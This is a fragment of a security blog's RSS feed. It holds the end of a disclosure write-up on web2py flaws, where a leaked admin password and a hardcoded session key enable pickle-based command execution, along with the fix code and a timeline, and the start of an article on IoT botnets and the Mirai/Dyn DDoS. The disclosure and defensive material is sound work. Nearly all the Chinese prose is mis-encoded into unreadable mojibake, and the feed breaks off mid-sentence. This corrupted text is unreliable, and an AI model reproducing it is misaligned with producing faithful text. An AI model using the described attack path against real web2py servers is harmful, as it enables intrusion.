&lt;p&gt;http://[target]/examples/template_examples/beautify é é¢æ´©æ¼äº†ç³»çµ±ç’°å¢ƒè®Šæ•¸ï¼Œç•¶ä½¿ç”¨è€…æ˜¯ä½¿ç”¨ standalone ç‰ˆæœ¬æ™‚ï¼Œç®¡ç†è€…çš„å¯†ç¢¼å°±æœƒåœ¨ç’°å¢ƒè®Šæ•¸è£¡å‡ºç¾ã€‚é€™å€‹å¯†ç¢¼å¯ç™»å…¥ http://[target]/admin ç®¡ç†ä»‹é¢ï¼Œç®¡ç†ä»‹é¢å…§æä¾›æ–¹ä¾¿çš„åŠŸèƒ½å¾—ä»¥åŸ·è¡Œä»»æ„æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/CVE-2016-3952.png&quot; alt=&quot;CVE-2016-3952&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å®˜æ–¹ä¿®å¾©&quot;&gt;å®˜æ–¹ä¿®å¾©&lt;/h3&gt;

&lt;p&gt;Version 2.14.1 ç§»é™¤æ´©æ¼çš„ç’°å¢ƒè®Šæ•¸ã€‚[&lt;a href=&quot;https://github.com/web2py/web2py/commit/9706d125b42481178d2b423de245f5d2faadbf40&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;Version 2.14.2 ä½¿ç”¨ä¸å›ºå®šå­—ä¸²ä½œç‚º session_cookie_keyï¼Œä¸¦ç§»é™¤æ´©æ¼é é¢ã€‚&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gluon.utils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ram&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;cookie_key&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;ç¸½çµ&quot;&gt;ç¸½çµ&lt;/h3&gt;

&lt;p&gt;web2py æ¡†æ¶é è¨­æœƒé–‹å•Ÿä¸€å€‹ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼ï¼Œè·¯å¾‘ç‚º http://[target]/examples/ã€‚&lt;br /&gt;
ç”±æ–¼é€™å€‹æ‡‰ç”¨ç¨‹å¼ä½¿ç”¨ Pickle ä¾†è™•ç†åºåˆ—åŒ–çš„ session cookieï¼Œä¸”å› ç‚ºåŠ å¯†å­—ä¸²ç‚ºå¯«æ­»çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt;ï¼Œä»»ä½•äººå¯ç«„æ”¹ session cookie çš„å…§å®¹ï¼Œè—‰æ­¤é€²è¡Œ Pickle å‘½ä»¤åŸ·è¡Œæ”»æ“Šã€‚&lt;br /&gt;
è©²ç¯„ä¾‹ç¨‹å¼ä»‹é¢ä¸­ä¹Ÿå­˜åœ¨ session_cookie_keyã€ç®¡ç†è€…å¯†ç¢¼æ´©æ¼å•é¡Œï¼Œå…©å€‹éƒ½æœƒå°è‡´ä»»æ„å‘½ä»¤åŸ·è¡Œã€‚é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨é€™å€‹æ‡‰ç”¨ç¨‹å¼ä¸­æ´©æ¼è¨±å¤šç³»çµ±é…ç½®ã€è·¯å¾‘ç­‰è³‡è¨Šï¼Œæœ‰æ©Ÿæœƒè¢«æ‹¿ä¾†åšé€²éšæ”»æ“Šã€‚&lt;br /&gt;
åœ¨ 2.14.2 ç‰ˆæœ¬å¾Œå·²ç¶“ä¿®å¾©æ‰€æœ‰æ´©æ¼å•é¡Œï¼Œç•¶ç„¶æœ€å¥½çš„è§£æ±ºè¾¦æ³•å°±æ˜¯é—œé–‰é€™å€‹ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼ã€‚&lt;/p&gt;

&lt;p&gt;æœ€å¾Œï¼Œä¾†æ•´ç†å¾é–‹ç™¼è€…çš„è§’åº¦åœ¨é€™å€‹æ¡ˆä¾‹ä¸­è©²æ³¨æ„çš„è¦é»ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å°å¿ƒè™•ç†åºåˆ—åŒ–å­—ä¸²ï¼Œä½¿ç”¨è€…è‹¥æœ‰æ©Ÿæœƒæ”¹è®Šè©²å­—ä¸²å€¼ï¼Œæœ‰æ©Ÿæœƒè¢«æ’å…¥æœªé æœŸçš„æƒ¡æ„ç‰©ä»¶ï¼Œé€ æˆæƒ¡æ„çš„çµæœã€‚&lt;/li&gt;
  &lt;li&gt;æ­£å¼ç”¢å“ä¸­åˆ‡è¨˜è¦ç§»é™¤ä»»ä½•è·Ÿé–‹ç™¼ç›¸é—œçš„é…ç½®ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2016/03/08 ç™¼ç¾å•é¡Œèˆ‡å…¶ä»–ç ”ç©¶&lt;/li&gt;
  &lt;li&gt;2016/03/09 å›å ±å®˜æ–¹ &lt;a href=&quot;https://github.com/web2py/web2py/issues/1205&quot;&gt;GitHub Issue&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;2016/03/15 æˆåŠŸèˆ‡é–‹ç™¼è€… email è¯ç¹«&lt;/li&gt;
  &lt;li&gt;2016/03/15 å®˜æ–¹ä¿®å¾©ç®¡ç†è€…å¯†ç¢¼æ´©æ¼å•é¡Œ (CVE-2016-3952)&lt;/li&gt;
  &lt;li&gt;2016/03/25 å®˜æ–¹ä¿®å¾©å…¶ä»–å¼±é»ä¸¦ç™¼ä½ˆ 2.14.2 ç‰ˆæœ¬&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;å…¶å¯¦ CVE-2016-3957 ä¸¦éä¸å®‰å…¨çš„è¨­è¨ˆï¼Œåœ¨è·Ÿ CVE team æºé€šçš„éç¨‹ä¸­ç™¼ç¾ web2py é–‹å§‹ä½¿ç”¨ JSON å–ä»£ Pickle [&lt;a href=&quot;https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0&quot;&gt;Ref&lt;/a&gt;]ï¼Œå› æ­¤åˆ¤å®š web2py èªç‚ºç›®å‰çš„è¨­è¨ˆæ˜¯ä¸æ´½ç•¶çš„ï¼Œçµ¦äºˆæ­¤ç·¨è™Ÿã€‚å¾Œä¾†å®˜æ–¹å› æ•…å°‡ Pickle æ”¹äº†å›ä¾†ï¼Œä¸éåœ¨æ²’æœ‰æ´©æ¼åŠ å¯†å­—ä¸²çš„å‰æä¸‹å·²ç¶“æ˜¯å®‰å…¨çš„äº†ã€‚Â &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;åœ¨è‡ªè¡Œæ¶è¨­çš„ web2py ç’°å¢ƒä¸­åªæœƒåŸ·è¡Œä¸€æ¬¡ï¼Œæ²’æœ‰å»ç´°è¿½ web2py å®˜æ–¹ç¶²ç«™ç‚ºä½•åŸ·è¡Œå…©æ¬¡ã€‚Â &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957/</link>
                <guid>https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957</guid>
                <pubDate>Tue, 03 Jan 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>IoTè¨­å‚™å•†åˆ¥æˆç‚ºå¹«å…‡ å¾Dyn DDoSæ”»æ“Šäº‹ä»¶çœ‹IoTå®‰å…¨</title>
                <description>&lt;h3 id=&quot;è¬ç‰©çš†è¯ç¶²æˆç‚ºè¬ç‰©çš†å¯é§­&quot;&gt;è¬ç‰©çš†è¯ç¶²æˆç‚ºè¬ç‰©çš†å¯é§­&lt;/h3&gt;

&lt;p&gt;2016å¹´10æœˆ21æ—¥çŸ¥åç¶²è·¯æœå‹™ Dyn é­å—æ®­å±ç¶²è·¯ç™¼å‹•ä¸‰æ³¢å·¨å¤§è¦æ¨¡ DDoS æ”»æ“Šï¼Œä¸–ç•Œå„å¤§ç¶²ç«™æœå‹™çš†å› ç‚ºæ­¤æ”»æ“Šè€Œä¸­æ–·ï¼ŒåŒ…æ‹¬ Amazonã€Twitterã€Githubã€PayPal ç­‰å¤§å‹ç¶²ç«™éƒ½å› æ­¤å—åˆ°å½±éŸ¿ã€‚è³‡å®‰äººå“¡ç ”ç©¶ç™¼ç¾ï¼Œæœ¬æ¬¡ DDoS æ”»æ“Šçš„ç™¼èµ·è€…æœªæ˜ï¼Œä½†å¤šæ•¸æ”»æ“Šæµé‡ä¾†è‡ªæ®­å±ç¶²è·¯ã€ŒMiraiã€ï¼Œåˆ©ç”¨ IPCAMã€CCTVã€DVRã€IoT è£ç½®ç­‰ç³»çµ±é€²è¡Œ DDoS æ”»æ“Šã€‚ç‚ºä»€éº¼é€™äº›è¨­å‚™æœƒæˆç‚ºæ”»æ“Šçš„å¹«å‡¶å‘¢ï¼Ÿæˆ‘å€‘åˆè©²å¦‚ä½•è‡ªä¿å‘¢ï¼Ÿ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;ä¸€å€‹æ”»æ“Šäº‹ä»¶ï¼Œä¸€å®šæœ‰èƒŒå¾Œçš„åŸå› ã€‚æ”»æ“Šè€…ä¸€å®šæ˜¯æœ‰æ‰€æ±‚ï¼Œæ‰æœƒé€²è¡Œæ”»æ“Šï¼Œå¯èƒ½æ˜¯æ±‚åã€æ±‚åˆ©æˆ–æ±‚æ¨‚è¶£ã€‚å› ç‚º DDoS æ”»æ“Šæœƒç›´æ¥å½±éŸ¿ç›®æ¨™ç³»çµ±çš„é‹ä½œï¼Œå°ç³»çµ±ç‡Ÿé‹é€ æˆå½±éŸ¿ï¼Œåœ¨é»‘è‰²ç”¢æ¥­çš„å¾ªç’°ä¸­é€šå¸¸æœƒåˆ©ç”¨é€™ç¨®æ”»æ“Šä¾†å‹’ç´¢éŒ¢è²¡ã€‚ä¾‹å¦‚é‡å°ç‡Ÿé‹ç·šä¸ŠéŠæˆ²çš„å…¬å¸é€²è¡Œ DDoS æ”»æ“Šï¼Œè®“éŠæˆ²æœå‹™ä¸­æ–·ï¼Œé€¼è¿«ä¼æ¥­å°‡ä¸»æ©Ÿçš„é€£ç·šèŠ±éŒ¢ã€Œè´–ã€å›ä¾†ã€‚ä½† Dyn é€™æ¬¡çš„äº‹ä»¶å„å®¶éƒ½æ²’æœ‰æ”¶åˆ°é¡ä¼¼çš„å‹’ç´¢ä¿¡ï¼Œå› æ­¤è³‡å®‰å°ˆå®¶å€‘æ¨æ¸¬ï¼Œé€™å¯èƒ½æ˜¯ä¸€æ¬¡ç·´å…µï¼Œæˆ–è€…ç”šè‡³æ˜¯ DDoS æ”»æ“Šæœå‹™çš„è¡ŒéŠ·æ‰‹æ³•ã€‚å¦‚æœæˆ‘å€‘ç”¨é»‘è‰²ç”¢æ¥­çš„è§’åº¦å»æ€è€ƒä¸€å€‹æ”»æ“Šè¡Œç‚ºï¼Œå°±æœƒæœ‰æˆªç„¶ä¸åŒçš„çœ‹æ³•ã€‚è©¦æƒ³ï¼Œå¦‚æœé€™æ˜¯ä¸€æ¬¡é§­å®¢çµ„ç¹”çš„å•†æ¥­è¡ŒéŠ·è¡Œç‚ºï¼Œç›®çš„æ˜¯å±•ç¾é€™å€‹åœ˜éšŠçš„ DDoS æ”»æ“Šç«åŠ›ï¼Œé€™æ¨£çš„æˆæœæ˜¯å¦å¯ä»¥ç¨±ä½œæ˜¯ä¸€å€‹æˆåŠŸæ¡ˆä¾‹å‘¢ï¼Ÿå¦‚æœä½ æ˜¯æœå‹™è³¼è²·è€…ï¼Œæ˜¯å¦å°é€™æ¨£çš„æœå‹™æœ‰ä¿¡å¿ƒå‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;åˆ©ç”¨ IoT è£ç½®åŠç¶²é€šè¨­å‚™ä½ˆå»ºæ®­å±ç¶²è·¯ (botnet) å·²ç¶“ä¸æ˜¯æ–°èã€‚Internet Census 2012 æ˜¯ä¸€æ¬¡è³‡å®‰åœˆçš„å¤§äº‹ä»¶ï¼Œä¸€å€‹ç¨±ç‚º Carna çš„ botnet åˆ©ç”¨äº†å…¨ä¸–ç•Œ 42 è¬å°è£ç½®ï¼Œæƒæå…¨ä¸–ç•Œæ•´å€‹ IPv4 è¨­å‚™ï¼Œè’é›† IP ä½¿ç”¨ç‹€æ³ã€é€£æ¥åŸ ã€æœå‹™æ¨™é ­ç­‰è³‡è¨Šï¼Œä¸¦ä¸”æä¾›å…±è¨ˆ 9TB è³‡æ–™é–‹æ”¾ä¸‹è¼‰ç ”ç©¶ã€‚è€Œé€™å€‹ botnet å¤šæ•¸åˆ©ç”¨è·¯ç”±å™¨ (router) çš„æ¼æ´ï¼Œåˆ©ç”¨é è¨­å¯†ç¢¼ã€ç©ºå¯†ç¢¼ç™»å…¥è¨­å‚™ï¼Œæ¤å…¥å¾Œé–€ä¾›æ”»æ“Šè€…æ§åˆ¶ã€‚è€Œå¾Œçš„å¹¾æ¬¡å¤§å‹æ”»æ“Šäº‹ä»¶éƒ½èˆ‡ IoT åŠåµŒå…¥å¼è£ç½®æœ‰é—œä¿‚ï¼Œè®“ IoT çš„å£è™Ÿã€Œè¬ç‰©çš†è¯ç¶²ã€æˆç‚ºã€Œè¬ç‰©çš†å¯é§­ã€ï¼Œä¹Ÿè®“è³‡å®‰ç ”ç©¶äººå“¡å°æ–¼ç ”ç©¶é€™é¡å‹è¨­å‚™è¶¨ä¹‹è‹¥é¶©ã€‚è¿‘å¹´æ™ºæ…§è»Šè¼›ä¸æ–·ç™¼å±•ï¼Œåœ‹éš›é–“ä¹Ÿä¸å°‘æ™ºæ…§è»Šè¼›è¢«é§­çš„äº‹ä»¶ã€‚è»Šè¼›è¢«é§­å½±éŸ¿çš„å°±ä¸å–®æ˜¯è³‡è¨Šç³»çµ±ï¼Œæ›´æœƒæ³¢åŠäººèº«å®‰å…¨ç”šè‡³æ•´å€‹åŸå¸‚çš„äº¤é€šï¼Œè³‡å®‰è€ƒé‡çš„å½±éŸ¿ä¹Ÿé æ¯”ä»¥å‰åš´é‡ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é€£ç¶²è£ç½®æˆç‚ºé§­å®¢ä¸‹æ‰‹çš„ä¸»è¦åŸå› &quot;&gt;é€£ç¶²è£ç½®æˆç‚ºé§­å®¢ä¸‹æ‰‹çš„ä¸»è¦åŸå› &lt;/h3&gt;

&lt;p&gt;ç©¶ç«Ÿæ˜¯æ€æ¨£çš„å®‰å…¨æ¼æ´è®“æ”»æ“Šè€…é€™éº¼è¼•æ˜“åˆ©ç”¨å‘¢ï¼Ÿç›®å‰æ”»æ“Šè€…åŠ botnet å¤šæ•¸åˆ©ç”¨çš„é‚„æ˜¯ä½¿ç”¨é è¨­å¯†ç¢¼ã€æˆ–ç”šè‡³æ˜¯æ²’æœ‰è¨­å®šå¯†ç¢¼çš„è£ç½®ã€‚ç¶²ç«™ &lt;a href=&quot;https://www.insecam.org&quot;&gt;Insecam&lt;/a&gt; æ­éœ²äº†å…¨ä¸–ç•Œæ•¸è¬æ”¯æœªä¿®æ”¹å¯†ç¢¼çš„æ”å½±æ©Ÿï¼Œå†å†é¡¯ç¤ºä¸å°‘æ°‘çœ¾æˆ–å…¬å¸è¡Œè™Ÿè³¼è²·äº†ç›£è¦–å™¨ï¼Œå»æ²’æœ‰å¥å…¨çš„è³‡å®‰æ„è­˜ï¼Œè®“ç›£è¦–å™¨æš´éœ²æ–¼å…¨ä¸–ç•Œä¹‹ä¸­ã€‚æ›´å¤šæ”å½±æ©Ÿã€ç›£è¦–å™¨ç­‰çš„è³‡å®‰è­°é¡Œå¯ä»¥åƒè€ƒæˆ‘å€‘çš„æ–‡ç« &lt;a href=&quot;http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/&quot;&gt;ã€Œç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR çš„è³‡å®‰è­°é¡Œ - ä½ çŸ¥é“æˆ‘åœ¨çœ‹ä½ å—ï¼Ÿã€&lt;/a&gt;ã€‚é™¤äº†é è¨­å¯†ç¢¼ä¹‹å¤–ï¼Œè¨­å‚™ä¸­çš„å¾Œé–€ä¹Ÿæ˜¯ä¸€å€‹å¤§å•é¡Œã€‚ä¸å°‘è·¯ç”±å™¨ã€ç„¡ç·šåŸºåœ°å°å» å•†è¢«çˆ†å‡ºç³»çµ±ä¸­å«æœ‰æ¸¬è©¦ç”¨çš„ç™»å…¥å¸³è™Ÿï¼Œè©²å¸³è™Ÿç„¡æ³•é—œé–‰ã€ç„¡æ³•ç§»é™¤ï¼Œä¸”å®¹æ˜“è¢«æ”»æ“Šè€…é€²è¡Œç ”ç©¶å–å¾—ã€‚é™¤äº†ç­‰å¾…å» å•†å‡ç´šéŸŒé«”ä¾†ä¿®è£œè©²å•é¡Œä¹‹å¤–ï¼Œæ²’æœ‰å…¶ä»–è§£æ³•ï¼Œå› æ­¤æˆç‚ºæ”»æ“Šè€…å¤§é‡å–å¾—æ§åˆ¶æ¬Šçš„æ–¹å¼ä¹‹ä¸€ã€‚&lt;/p&gt;

&lt;p&gt;IoT è£ç½®ç‚ºä»€éº¼æœƒæˆç‚ºæ”»æ“Šè€…ä¸‹æ‰‹çš„ç›®æ¨™å‘¢ï¼Ÿæˆ‘å€‘å¯ä»¥åˆ†æˆå¹¾é»ä¾†æ¢è¨ã€‚&lt;/p&gt;

&lt;p&gt;ç¬¬ä¸€ï¼ŒåµŒå…¥å¼è£ç½®ä»¥å¾€çš„è¨­è¨ˆéƒ½æ˜¯ä¸é€£ç¶²ï¼ŒIoT çš„é¢¨æ½®èˆˆèµ·ä¹‹å¾Œï¼Œå„å» å•†ä¹Ÿç‚ºäº†æ¶å¸‚å ´å…ˆæ©Ÿï¼ŒåŠ é€Ÿæ¨å‡ºç”¢å“ï¼Œå°‡åŸæœ¬çš„ç”¢å“åŠ ä¸Šç¶²è·¯åŠŸèƒ½ï¼Œç”šè‡³ App æ§åˆ¶åŠŸèƒ½ã€‚è€Œæ±‚å¿«çš„çµæœå°±æ˜¯çŠ§ç‰²è³‡å®‰è€ƒé‡ï¼ŒåŠ ä¸Šå» å•†å¯èƒ½åŸæœ¬ä¸¦éç¶²è·¯å°ˆé•·ï¼Œä¹Ÿæ²’æœ‰è¶³å¤ çš„è³‡å®‰äººå“¡æª¢è¦–å®‰å…¨æ€§ï¼Œå°è‡´è¨­è¨ˆå‡ºä¾†çš„ç”¢å“è³‡å®‰æ¼æ´å±¤å‡ºä¸çª®ã€‚ç”¢å“çš„è¨­è¨ˆå¿…é ˆåš´å®ˆ Security by Design çš„åŸå‰‡ï¼Œåœ¨é–‹ç™¼åˆæœŸçš„æ¯å€‹ç’°ç¯€éƒ½ç´å…¥è³‡å®‰è€ƒé‡ï¼Œä¸¦ä¸”éµå®ˆ Secure Coding è¦ç¯„ï¼Œé¿å…åœ¨ç”¢å“å¾ŒæœŸç–ŠåºŠæ¶å±‹ï¼Œé€ æˆè¦é‡æ¸…è³‡å®‰å•é¡Œçš„æ ¹æºæ›´é›£å¦‚ç™»å¤©ã€‚&lt;/p&gt;

&lt;p&gt;ç¬¬äºŒï¼Œç”¢å“çš„æ›´æ–°æ©Ÿåˆ¶å•é¡Œã€‚IoT è£ç½®çš„æ›´æ–°æ©Ÿåˆ¶åœ¨æ—©æœŸä¸¦æ²’æœ‰è¬¹æ…è€ƒé‡ï¼Œéœ€è¦ä½¿ç”¨è€…è‡ªè¡Œä¸‹è¼‰éŸŒé«”æ›´æ–°ï¼Œç”šè‡³æœ‰äº›è£ç½®å¿…é ˆå›å» æ‰èƒ½é€²è¡Œæ›´æ–°ã€‚ä¸å°‘ä½¿ç”¨è€…åªè¦ç”¢å“æ²’æœ‰å‡ºå•é¡Œï¼Œä¸¦ä¸æœƒä¸»å‹•é€²è¡ŒéŸŒé«”æ›´æ–°ï¼Œç”šè‡³è¦ºå¾—æ›´æ–°åªæœƒé€ æˆæ›´å¤šå•é¡Œã€‚åœ¨æ²’æœ‰ä¾¿åˆ©æ›´æ–°æ©Ÿåˆ¶çš„æƒ…æ³ä¹‹ä¸‹ï¼Œè¨­å‚™çš„è³‡å®‰å•é¡Œæ›´é›£ä»¥è¢«å¦¥å–„è™•ç†ã€‚è¿‘æœŸå› ç‚ºè³‡å®‰äº‹ä»¶é »å‚³ï¼ŒFOTA (Firmware Over-The-Air) æ©Ÿåˆ¶æ‰é€æ¼¸è¢«é‡è¦–ï¼Œä½†å…¶ä»–è³‡å®‰å•é¡Œä¹Ÿéš¨å³è€Œä¾†ã€‚å¦‚ä½•ç¢ºä¿éŸŒé«”çš„å®Œæ•´æ€§ï¼Ÿå¦‚ä½•é˜²æ­¢æ”»æ“Šè€…ä¸‹è¼‰éŸŒé«”é€²è¡Œç ”ç©¶ä¿®æ”¹ï¼Ÿé€™äº›éƒ½æ˜¯å» å•†éœ€è¦ä¸æ–·å»åè¦†æ€é‡çš„ã€‚&lt;/p&gt;

&lt;p&gt;ç¬¬ä¸‰ï¼Œæ•µæš—æˆ‘æ˜ï¼Œä¹Ÿæ˜¯æˆ‘å€‘èªç‚ºæœ€é‡è¦çš„ä¸€é»ã€‚æˆ‘å€‘èªç‚ºè³‡å®‰å°±æ˜¯æ”»æ“Šè€…èˆ‡é˜²ç¦¦è€…çš„ä¸€å ´è³‡è¨Šä¸å°ç¨±æˆ°çˆ­ï¼Œé˜²ç¦¦è€…ï¼ˆå» å•†ï¼‰é€šå¸¸åªæœƒæ†‘è—‰è‘—è‡ªå·±çš„çŸ¥è­˜è·Ÿæƒ³åƒé€²è¡Œé˜²ç¦¦ï¼Œä½†å»ä¸çŸ¥é“æ”»æ“Šè€…çš„æ€ç¶­è·Ÿæ‰‹æ³•ã€‚å°±åƒæ˜¥ç§‹æ™‚ä»£å…¬è¼¸èˆ¬ï¼Œå»ºé€ é›²æ¢¯å”åŠ©æ¥šåœ‹æ”»æ“Šå®‹åœ‹çš„åŸæ± ã€‚å”¯æœ‰äº†è§£æ”»æ“Šè€…ï¼ŒåŒ–è§£é€™å€‹ä¸å°ç¨±çš„è³‡è¨Šï¼Œæ‰èƒ½æœ‰æ•ˆçš„é€²è¡Œé˜²ç¦¦ï¼Œå¦‚åŒå¢¨å­äº†è§£é›²æ¢¯çš„æ”»æ“Šæ–¹å¼ï¼Œæ¨¡æ“¬å„ç¨®å°æ‡‰é˜²ç¦¦çš„æ‰‹æ³•ï¼Œæ‰æˆåŠŸè®“æ¥šç‹æ”¾æ£„æ”»æ“Šã€‚ä¸åƒ…æ˜¯ IoT å» å•†ï¼Œæ‰€æœ‰ä¼æ¥­éƒ½å¿…é ˆäº†è§£æ”»æ“Šè€…çš„æ€ç¶­ã€æ‰‹æ³•ï¼ŒçŸ¥æ›‰é€™å€‹é»‘è‰²ç”¢æ¥­çš„é‹ä½œï¼Œç”šè‡³é‡å°æ”»æ“Šçš„æ–¹å¼é€²è¡Œæ¨¡æ“¬æ¼”ç·´ï¼Œå°‡æ¯ä¸€å€‹é˜²ç¦¦çš„ç¼ºå£è£œè¶³ï¼Œæ‰å¯ä»¥æ­£é¢è¿æˆ°æ”»æ“Šè€…ã€‚&lt;/p&gt;

&lt;h3 id=&quot;è¨­å‚™å•†é¿å…æˆç‚ºå¹«å‡¶æ¶ˆè²»è€…ä¹Ÿæ‡‰è‡ªä¿&quot;&gt;è¨­å‚™å•†é¿å…æˆç‚ºå¹«å‡¶ï¼Œæ¶ˆè²»è€…ä¹Ÿæ‡‰è‡ªä¿&lt;/h3&gt;

&lt;p&gt;èº«ç‚ºä½¿ç”¨è€…ï¼Œæˆ‘å€‘è©²å¦‚ä½•ç¢ºèªè‡ªå·±çš„è¨­å‚™æœ‰æ²’æœ‰è¢«æ„ŸæŸ“å‘¢ï¼Ÿè‹¥è¢«æ„ŸæŸ“è©²æ€éº¼æœ‰æ•ˆæ¸…é™¤å‘¢ï¼Ÿå»ºè­°å…ˆæœå°‹ç¶²è·¯ä¸Šç›®å‰å·²å…¬é–‹æœ‰æ¼æ´çš„å» ç‰ŒåŠå‹è™Ÿï¼Œè‹¥åœ¨å•é¡Œæ¸…å–®ä¹‹å…§ï¼Œå…ˆå°‡æ•´å°è¨­å‚™å‚™ä»½è¨­å®šå¾Œï¼Œå›å¾©åŸå» åˆå§‹è¨­å®šï¼Œä»¥ç¢ºä¿æ”»æ“Šè€…æ”¾ç½®çš„æƒ¡æ„ç¨‹å¼éƒ½è¢«æ¸…é™¤ã€‚æ¥è‘—æ›´æ–°å» å•†æ‰€é‡‹å‡ºçš„æ–°ç‰ˆéŸŒé«”ï¼Œä¸¦è¨˜å¾—åœ¨æ›´æ–°å®‰è£å®Œç•¢å¾Œç«‹å³æ›´æ›å¯†ç¢¼ä»¥é˜²äºŒåº¦è¢«å…¥ä¾µã€‚è‹¥å» å•†ç„¡é‡‹å‡ºæ›´æ–°ï¼Œå¯èƒ½æ˜¯è³‡å®‰ä¸è¢«é‡è¦–ï¼Œä¹Ÿå¯èƒ½æ˜¯å» å•†å·²ç¶“çµæŸç‡Ÿé‹ã€‚å¦‚æœé‚„æ˜¯é¸æ“‡è¦ä½¿ç”¨é€™å€‹è¨­å‚™ï¼Œå»ºè­°å°‡è¨­å‚™è½‰æ”¾åœ¨å…§éƒ¨ç¶²è·¯ï¼Œæˆ–è€…æ˜¯åœ¨å‰é¢å¢åŠ é˜²ç¦¦è¨­å‚™ï¼Œé¿å…æ”»æ“Šè€…å…¥ä¾µã€‚&lt;/p&gt;

&lt;p&gt;è‡³æ–¼å» å•†è©²æ€éº¼è·Ÿä¸Šè³‡å®‰çš„è…³æ­¥å‘¢ï¼Ÿæˆ‘å€‘èªç‚ºç›®å‰å» å•†æœ€é‡è¦çš„å°±æ˜¯è³‡å®‰æ„è­˜ã€‚é€™å·²ç¶“æ˜¯è€ç”Ÿå¸¸è«‡ï¼Œä»¥å¾€ç¶²è·¯ç”¢æ¥­é€æ¼¸é‡è¦–è³‡å®‰ï¼Œä½†è·¨å…¥ç¶²è·¯çš„å…¶ä»–è³‡è¨Šç”¢æ¥­ææ€•é‚„æ²’æ„è­˜åˆ°è³‡å®‰çš„åš´é‡æ€§ã€‚å‡¡èˆ‰å‚³çµ±å®¶é›»è½‰ç‚ºæ™ºæ…§å®¶é›»ã€è»Šè¼›è½‰ç‚ºæ™ºæ…§è»Šè¼›ã€ç”šè‡³åŸºç¤å»ºè¨­ä¹Ÿé€æ¼¸è³‡è¨ŠåŒ–çš„ç¾åœ¨ï¼Œè‹¥é€™äº›è¸å…¥ç¶²è·¯çš„ç”¢æ¥­æ²’æœ‰ç›¸å°æ‡‰çš„è³‡å®‰æ„è­˜ï¼Œææ€•å¾ˆé›£åœ¨åˆæœŸå°±é é˜²é¢¨éšªçš„ç™¼ç”Ÿã€‚ä¼æ¥­ä¹Ÿå¿…é 